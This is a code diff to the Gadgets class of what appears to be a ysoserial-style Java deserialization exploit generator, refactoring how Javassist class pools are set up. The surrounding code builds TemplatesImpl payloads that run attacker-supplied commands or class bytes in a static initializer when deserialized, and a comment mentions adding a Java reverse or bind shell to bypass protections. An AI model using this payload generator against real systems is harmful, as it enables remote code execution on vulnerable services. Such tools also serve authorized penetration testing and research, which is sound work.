@@ -84,15 +84,16 @@ public class Gadgets {
         final T templates = tplClass.newInstance();
         byte[] classBytes = null;
         String tmplClazzName = "T" + System.nanoTime();
-        ClassPool pool = ClassPool.getDefault();
+        ClassPool pool = new ClassPool();
+        // use template gadget class
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
 
         if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_FILE)){
             classBytes = CommonUtil.readFileByte(command.substring(CustomCommand.COMMAND_CLASS_FILE.length()));
         }else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_BASE64)){
             classBytes = new BASE64Decoder().decodeBuffer(command.substring(CustomCommand.COMMAND_CLASS_BASE64.length()));
         } else {
-            // use template gadget class
-            pool.insertClassPath(new ClassClassPath(abstTranslet));
+
 
             // run command in static initializer
             // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
@@ -111,8 +112,9 @@ public class Gadgets {
         }
 
         // inject class bytes into instance
-        final CtClass foo = pool.makeClass("Foo");
+        CtClass foo = pool.makeClass("Foo");
         foo.defrost();
+
         CtClass clsSerializable = pool.get("java.io.Serializable");
         foo.setInterfaces(new CtClass[]{clsSerializable});
         foo.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", foo));
@@ -134,15 +136,16 @@ public class Gadgets {
     public static Object createCompressTemplatesImpl(final String command) throws Exception {
         TemplatesImpl templates = TemplatesImpl.class.newInstance();
         byte[] classBytes = null;
-        ClassPool classPool = ClassPool.getDefault();
+        ClassPool classPool = new ClassPool();
+        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
 
         if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_FILE)){
             classBytes = CommonUtil.readFileByte(command.substring(CustomCommand.COMMAND_CLASS_FILE.length()));
         }else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_BASE64)){
             classBytes = new BASE64Decoder().decodeBuffer(command.substring(CustomCommand.COMMAND_CLASS_BASE64.length()));
         } else {
-            classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
             CtClass clazz = classPool.makeClass("C");
+            clazz.defrost();
             String code = TemplatesImplUtil.getCmd(command);
             clazz.makeClassInitializer().insertAfter(code);
             CtClass superC = classPool.get(AbstractTranslet.class.getName());
@@ -154,7 +157,6 @@ public class Gadgets {
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
         Reflections.setFieldValue(templates, "_name", "P");
 
-        classPool.getCtClass("C").defrost();
         return templates;
     }
 
